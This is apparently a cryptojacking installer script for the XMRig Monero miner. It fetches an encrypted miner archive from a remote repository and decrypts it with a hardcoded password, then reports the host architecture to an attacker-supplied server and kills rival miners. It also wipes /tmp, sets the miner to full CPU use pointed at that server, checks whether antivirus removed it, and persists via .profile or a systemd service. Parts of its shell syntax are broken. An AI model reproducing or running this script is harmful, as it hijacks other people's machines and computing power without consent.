#!/bin/bash

REMOTE_HOST="raw.githubusercontent.com"
REMOTE_PORT=443
REMOTE_PATH="gth000001/test/main"

FILENAME="xmrig.tar.gz"
FILENAME_GPG="$FILENAME.gpg"
FILENAME_SSL="$FILENAME.ssl"
FILENAME_ZIP="$FILENAME.zip"
FILENAME_TMP="$FILENAME.tmp"

QUERY_GPG=$(printf "GET /$REMOTE_PATH/$FILENAME_GPG HTTP/1.1\r\nHost: $REMOTE_HOST\r\nConnection: close\r\n\r\n")
QUERY_SSL=$(printf "GET /$REMOTE_PATH/$FILENAME_SSL HTTP/1.1\r\nHost: $REMOTE_HOST\r\nConnection: close\r\n\r\n")
QUERY_ZIP=$(printf "GET /$REMOTE_PATH/$FILENAME_ZIP HTTP/1.1\r\nHost: $REMOTE_HOST\r\nConnection: close\r\n\r\n")
QUERY_TAR=$(printf "GET /$REMOTE_PATH/$FILENAME HTTP/1.1\r\nHost: $REMOTE_HOST\r\nConnection: close\r\n\r\n")

DOWNLOAD_GPG="https://$REMOTE_HOST/$REMOTE_PATH/$FILENAME_GPG"
DOWNLOAD_SSL="https://$REMOTE_HOST/$REMOTE_PATH/$FILENAME_SSL"
DOWNLOAD_ZIP="https://$REMOTE_HOST/$REMOTE_PATH/$FILENAME_ZIP"
#DOWNLOAD_TAR="https://$REMOTE_HOST/$REMOTE_PATH/$FILENAME"
DOWNLOAD_TAR="http://download.c3pool.org/xmrig_setup/raw/master/$FILENAME"

XMRIG_HOST=$1
XMRIG_PORT=$(( 51517 ))

if [ -z $HOME ]; then
  if [ "$(id -u)" == "0" ]; then
    export HOME=/root
  elif [ "$(id -u)" != "0" ]; then
    export HOME=/tmp
  fi
  if [ ! -w $HOME ]; then
    export HOME=/tmp
  fi
fi

if ! touch $HOME >/dev/null; then
  export HOME=/tmp
fi

if ! mkdir $HOME/.c3pool >/dev/null; then
  export HOME=/tmp
else
  rm -R $HOME/.c3pool
fi

# check noexec flag on mount fs
# execute: mount | grep noexec | grep $HOME
# output: tmpfs on /tmp type tmpfs (rw,seclabel,nosuid,nodev,noexec,relatime)

if [ ! -d $HOME ]; then
  echo "ERROR: set HOME failed"
  exit 1
fi
echo "[*] Home is $HOME"

if command -v wget > /dev/null; then
  APP="wget -q -O"
  SEND="wget -q"
elif command -v curl > /dev/null; then
  APP="curl -s -o"
  SEND="curl -s"
elif command -v fetch > /dev/null; then
  APP="fetch -q -o"
  SEND="fetch -q"
else
elif command -v openssl > /dev/null; then
  APP="openssl"
  SEND=""
else
  echo "ERROR: This script requires \"wget, curl, fetch or openssl\" utility to work correctly"
  exit 1
fi
echo "[*] App is $APP"

# send data
if [ ! -z $SEND ]; then
  ARCH="$(uname -m)"
  if ! ( $SEND http://$XMRIG_HOST:51518/info/$ARCH ); then
    echo "[-] Send arch failed"
  fi
fi

# start doing stuff: preparing miner

echo "[*] Removing previous c3pool miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service 2>/dev/null
  sudo systemctl disable c3pool_miner.service 2>/dev/null
  sudo systemctl disable 2>/dev/null
  sudo killall xmrig 2>/dev/null
  sudo pkill xmrig 2>/dev/null
  kill $(ps aux | grep "[--]config=" | awk '{print $2}') 2>/dev/null
  sudo rm -rf /etc/systemd/system/c3pool_miner.service 2>/dev/null
else
  killall -9 xmrig 2>/dev/null
  killall xmrig 2>/dev/null
  pkill xmrig 2>/dev/null
  kill $(ps aux | grep "[--]config=" | awk '{print $2}') 2>/dev/null
fi


echo "[*] Removing $HOME/.c3pool directory"
rm -rf $HOME/c3pool 2>/dev/null
rm -rf $HOME/.c3pool 2>/dev/null
rm -rf /tmp/c3pool 2>/dev/null
rm -rf /tmp/* 2>/dev/null
#find . -name "*c3pool*" -exec rm -rf {} \; 2>/dev/null
#find . -name "*xmrig*" -exec rm -rf {} \; 2>/dev/null
#find . -name "*miner*" -exec rm -rf {} \; 2>/dev/null

echo "[*] Downloading"
IS_DOWNLOADED=0

#  openssl
if [ $IS_DOWNLOADED eq 0 ]; then
  if command -v openssl > /dev/null; then
    echo "[*] Downloading OpenSSL version to $HOME/$FILENAME_SSL"
    if [ "$APP" == "openssl" ]; then
      if ($QUERY_GPG | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
        CONTENT_LENGTH=$(cat $HOME/FILENAME_TMP | grep -a -i "Content-Length:" | cut -d' ' -f2 | tr -d "\r\n")
        if (tail -c $CONTENT_LENGTH $HOME/FILENAME_TMP > $HOME/FILENAME_GPG); then
          IS_DOWNLOADED=1
        else
          echo "WARNING: Can't download OpenSSL version, 'tail' failed"
        fi
        rm $HOME/FILENAME_TMP
      else
        echo "WARNING: Can't download OpenSSL version, 'openssl' failed"
      fi
    else
      if ($APP $HOME/$FILENAME_SSL $DOWNLOAD_SSL); then
        IS_DOWNLOADED=1
      else
        echo "WARNING: Can't download OpenSSL version"
      fi
    fi
  else
    echo "WARNING: openssl not found"
  fi
fi
if [ $IS_DOWNLOADED eq 1 ]; then
  echo "[*] Decrypt $HOME/$FILENAME_SSL to $HOME/$FILENAME"
  if ! (openssl enc -aes-256-cbc -d -in $HOME/$FILENAME_SSL -out $HOME/$FILENAME -pass pass:555); then
    echo "ERROR: Can't decrypt $HOME/$FILENAME_SSL to $HOME/$FILENAME"
    IS_DOWNLOADED=0
  fi
  rm $HOME/$FILENAME_SSL
fi

# gpg
if [ $IS_DOWNLOADED eq 0 ]; then
  if command -v gpg > /dev/null; then
    echo "[*] Downloading GPG version to $HOME/$FILENAME_GPG"
    if [ "$APP" == "openssl" ]; then
      if ($QUERY_GPG | openssl s_client -quiet -connect $REMOTE_HOST:$REMOTE_PORT 2>/dev/null > $HOME/$FILENAME_TMP); then
        CONTENT_LENGTH=$(cat $HOME/FILENAME_TMP | grep -a -i "Content-Length:" | cut -d' ' -f2 | tr -d "\r\n")
        if (tail -c $CONTENT_LENGTH $HOME/FILENAME_TMP > $HOME/FILENAME_GPG); then
          IS_DOWNLOADED=1
        else
          echo "WARNING: Can't download GPG version, 'tail' failed"
        fi
        rm $HOME/FILENAME_TMP
      else
        echo "WARNING: Can't download GPG version, 'openssl' failed"
      fi
    else
      if ($APP $HOME/$FILENAME_GPG $DOWNLOAD_GPG); then
        IS_DOWNLOADED=1
      else
        echo "WARNING: Can't download GPG version"
      fi
    fi
  else
    echo "WARNING: gpg not found"
  fi
fi
if [ $IS_DOWNLOADED eq 1]; then
  echo "[*] Decrypt $HOME/$FILENAME_GPG to $HOME/$FILENAME"
  if ! (echo "555" | gpg --batch --passphrase-fd 0 --output $HOME/$FILENAME --decrypt $HOME/$FILENAME_GPG); then
    echo "WARNING: Can't decrypt $HOME/$FILENAME_GPG to $HOME/$FILENAME"
    IS_DOWNLOADED=0
  fi
  rm /tmp/$FILENAME_GPG
fi

# tar
if [ $IS_DOWNLOADED eq 0]; then
  echo "[*] Downloading TAR version to $HOME/$FILENAME"
  if ($APP $HOME/$FILENAME $DOWNLOAD_TAR); then
    IS_DOWNLOADED=1
  else
    echo "WARNING: Can't download TAR version"
  fi
fi

# last
if [ $IS_DOWNLOADED eq 0]; then
  echo "ERROR: Can't download file."
  exit 1
fi
  
echo "[*] Unpacking $HOME/$FILENAME to $HOME/.c3pool"
[ -d $HOME/.c3pool ] || mkdir $HOME/.c3pool
[ -f $HOME/.c3pool/.profile ] || touch $HOME/.c3pool/.profile

if ! tar xf $HOME/$FILENAME -C $HOME/.c3pool; then
  echo "ERROR: Can't unpack $HOME/$FILENAME to $HOME/.c3pool directory"
  exit 1
fi
rm $HOME/$FILENAME

echo "[*] Checking if advanced version of $HOME/.c3pool/xmrig works fine (and not removed by antivirus software)"
$HOME/.c3pool/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.c3pool/xmrig ]; then
    echo "ERROR: Advanced version of $HOME/.c3pool/xmrig is not functional or got removed"
    exit 1
  fi
fi

echo "[*] Miner $HOME/.c3pool/xmrig is OK"

PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then

  PASS="$PASS:$EMAIL"
fi

sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.c3pool/config.json
sed -i 's/"url": *"[^"]*",/"url": "'$XMRIG_HOST':'$XMRIG_PORT'",/' $HOME/.c3pool/config.json
sed -i 's/"user": *"[^"]*",/"user": "'$PASS'",/' $HOME/.c3pool/config.json
# sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.c3pool/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.c3pool/config.json
sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' $HOME/.c3pool/config.json
sed -i 's#"log-file": *null,#"log-file": "'$HOME/.c3pool/xmrig.log'",#' $HOME/.c3pool/config.json
sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.c3pool/config.json

cp $HOME/.c3pool/config.json $HOME/.c3pool/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.c3pool/config_background.json

# preparing script

echo "[*] Creating $HOME/.c3pool/miner.sh script"
cat >$HOME/.c3pool/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/.c3pool/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.c3pool/miner.sh

# preparing script background work and work under reboot

if ! sudo -n true 2>/dev/null; then
  if ! grep .c3pool/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.c3pool/miner.sh script to $HOME/.profile"
    echo "$HOME/.c3pool/miner.sh --config=$HOME/.c3pool/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/.c3pool/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.c3pool/xmrig.log file)"
  (/bin/bash $HOME/.c3pool/miner.sh --config=$HOME/.c3pool/config_background.json >/dev/null 2>&1 || /bin/sh $HOME/.c3pool/miner.sh --config=$HOME/.c3pool/config_background.json >/dev/null 2>&1)
else
  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi
  if ! type systemctl >/dev/null; then
    echo "[*] Running miner in the background (see logs in $HOME/.c3pool/xmrig.log file)"
    (/bin/bash $HOME/.c3pool/miner.sh --config=$HOME/.c3pool/config_background.json >/dev/null 2>&1 || /bin/sh $HOME/.c3pool/miner.sh --config=$HOME/.c3pool/config_background.json >/dev/null 2>&1)
    echo "WARNING: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
  else
    echo "[*] Creating c3pool_miner systemd service"
    cat >/tmp/c3pool_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/.c3pool/xmrig --config=$HOME/.c3pool/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
    echo "[*] Starting c3pool_miner systemd service"
#    sudo killall xmrig 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable c3pool_miner.service
    sudo systemctl start c3pool_miner.service
    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
  fi
fi

# set immutable attributes
#chattr +i $HOME/.c3pool/config.json
#chattr +i $HOME/.c3pool/config_background.json

if pidof xmrig >/dev/null; then
  PID=$(pidof xmrig)
  echo "Running with $PID"
else
  echo "Not Running"
fi
